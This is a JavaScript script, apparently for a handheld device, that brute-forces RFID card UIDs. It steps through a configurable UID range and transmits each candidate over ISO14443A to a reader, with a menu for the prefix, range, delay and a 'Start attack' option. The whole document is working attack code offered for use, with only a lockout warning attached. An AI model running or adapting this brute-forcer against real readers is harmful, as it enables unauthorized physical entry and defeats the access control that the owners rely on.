// Bruteforce RFID UIDs  
// Use at your own risk, some systems may lock out after multiple failed attempts!  
// Made by domboryss_  

var value_prefix = 0xABCD0000;  
var no_bits = 16;  
var delay_ms = 200;  
var protocol = "ISO14443A";  

function brute_force() {  
    var max_val = value_prefix + (1 << no_bits);  
    
    for (var brute_val = value_prefix; brute_val < max_val; brute_val++) {  
        var curr_val = brute_val.toString(16).toUpperCase();  
        
        drawString("Trying UID", 3, 0);  
        drawString(curr_val, 3, 16);  
        drawString("Hold any key to stop", 3, 32);  
        
        if (getAnyPress()) break;  
        
        serialCmd("RFIDSend {\"Protocol\":\"" + protocol + "\",\"UID\":\"0x" + curr_val + "\"}");  
        
        delay(delay_ms);  
        fillScreen(0);  
    }  
}  

while (true) {    
    var choice = dialogChoice([  
        "Init UID Prefix: " + value_prefix, "value_prefix",  
        "Range bits: " + no_bits, "no_bits",  
        "Delay: " + delay_ms, "delay_ms",  
        "Protocol: " + protocol, "protocol",  
        "Start attack", "attack"  
    ]);  

    if (choice == "") break;    
    else if (choice == "value_prefix") value_prefix = parseInt(keyboard(String(value_prefix), 32, "Starting UID"));  
    else if (choice == "no_bits") no_bits = parseInt(keyboard(String(no_bits), 32, "Bits to iterate"));  
    else if (choice == "delay_ms") delay_ms = parseInt(keyboard(String(delay_ms), 32, "Delay (ms)"));  
    else if (choice == "protocol") protocol = keyboard(protocol, 32, "Protocol");  
    else if (choice == "attack") {  
        if (!value_prefix || !no_bits || !delay_ms || !protocol) {  
            dialogError("Invalid parameters");  
            continue;  
        }  
        brute_force();  
    }  

    fillScreen(0);  
}  